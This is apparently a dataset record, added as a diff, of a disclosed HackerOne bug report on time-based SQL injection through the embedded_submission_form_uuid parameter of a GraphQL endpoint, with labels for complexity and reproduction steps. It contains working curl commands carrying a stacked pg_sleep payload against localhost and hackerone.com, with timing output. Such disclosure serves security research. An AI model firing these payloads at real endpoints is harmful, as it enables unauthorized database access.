@@ -1,0 +1,42 @@
+{
+  "reported_to": "HackerOne",
+  "reported_by": "jobert ",
+  "title": "SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter",
+  "content": "\nThe embedded_submission_form_uuid parameter in the /graphql endpoint is vulnerable to a SQL injection. Execute the following command to reproduce the behavior:\nLocally:\nCode 126 Bytes\n1curl -X POST http://localhost:8080/graphql\\?embedded_submission_form_uuid\\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\\(30\\)%3B--%27\nHackerOne.com\nCode 126 Bytes\n1curl -X POST https://hackerone.com/graphql\\?embedded_submission_form_uuid\\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\\(30\\)%3B--%27\nAdditional proof\nCode 580 Bytes\n1$ time curl -X POST https://hackerone.com/graphql\\?embedded_submission_form_uuid\\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\\(5\\)%3B--%27\n2{}curl -X POST   0.03s user 0.01s system 0% cpu 5.726 total\n3$ time curl -X POST https://hackerone.com/graphql\\?embedded_submission_form_uuid\\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\\(1\\)%3B--%27\n4{}curl -X POST   0.03s user 0.01s system 2% cpu 1.631 total\n5$ time curl -X POST https://hackerone.com/graphql\\?embedded_submission_form_uuid\\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\\(10\\)%3B--%27\n6{}curl -X POST   0.02s user 0.01s system 0% cpu 10.557 total\nImpact\nThe SQL injections seems to be executing in the context of the secure schema, so impact is currently unknown. However, since an attacker may be able to switch schemas, we should consider this to have a high impact on confidentiality.\n\n",
+  "severity": [
+    10.0,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1543559160,
+  "report_url": "https://hackerone.com/reports/435066",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Send a POST request to the GraphQL endpoint with a malicious SQL injection payload in the embedded_submission_form_uuid parameter"
+    ],
+    [
+      2,
+      "Observe the delayed response indicating successful SQL injection execution (e.g., pg_sleep(30))"
+    ]
+  ],
+  "vuln_description": "The embedded_submission_form_uuid parameter in the /graphql endpoint is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL commands including time-delay operations.",
+  "reason": "The vulnerability is straightforward to discover as it involves a classic SQL injection pattern in a single parameter. The attack doesn't require understanding complex application states or novel logic, just basic SQL injection knowledge and testing common parameters.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The SQL injection vulnerability involves direct manipulation of the embedded_submission_form_uuid parameter in the GraphQL endpoint, which is not related to authentication or authorization boundaries. The described methodology focuses on testing AuthN/AuthZ and IDOR vulnerabilities by swapping user sessions or resource IDs, not on detecting SQL injection vulnerabilities.",
+    "is_detectable": false
+  }
+}
